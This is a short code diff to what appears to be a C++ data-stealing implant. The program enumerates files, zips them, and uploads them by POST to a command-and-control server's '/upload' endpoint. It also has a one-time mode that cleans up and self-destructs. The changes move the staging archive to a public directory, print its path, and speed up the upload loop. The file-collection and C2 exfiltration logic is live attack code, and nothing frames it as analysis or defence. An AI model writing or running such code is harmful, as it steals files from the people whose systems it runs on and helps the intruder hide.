@@ -35,7 +35,7 @@ std::map<std::string, std::map<std::string, std::string>> FileEnum() {
 
 
 void GenZip() {
-    std::string tmpDir = TmpPath();
+    std::string pubDir = PublicDir();
     std::map<std::string, std::map<std::string, std::string>> results = FileEnum();
 
     // read paths from results and save them to filesToZip 
@@ -51,7 +51,7 @@ void GenZip() {
     }
 
     // Zip the files
-    std::wstring zipDest = std::wstring(tmpDir.begin(), tmpDir.end()) + L"zipped.zip";
+    std::wstring zipDest = std::wstring(pubDir.begin(), pubDir.end()) + L"zipped.zip";
     zipDestStr = WStringToString(zipDest);
     int zipResult = ZipFiles(zipDest, filesToZip);
     if (zipResult != ZIP_SUCCESS) {
@@ -69,8 +69,9 @@ void GenZip() {
 
 int main() {
     std::wstring uid;
-    std::string tmpDir = TmpPath();
-    std::string zipFile = tmpDir + "zipped.zip";
+    std::string pubDir = PublicDir();
+    std::string zipFile = pubDir + "zipped.zip";
+    std::cout << "This is where zip file is being saved: " << zipFile << std::endl;
 
     // Mode 1: run once and then > cleanup > self destruct
     if (ONETIMERUN) {
@@ -139,7 +140,7 @@ int main() {
                 std::wstring FileUploadURL = C2 + L"/upload";
                 std::string FilerResponse = SendData(L"POST", FileUploadURL, L"", EncodedBytes, L"");
                 std::cout << "JSON response for /upload: " << FilerResponse << std::endl;
-                Sleep(5000);
+                Sleep(1000);
             }
             
 
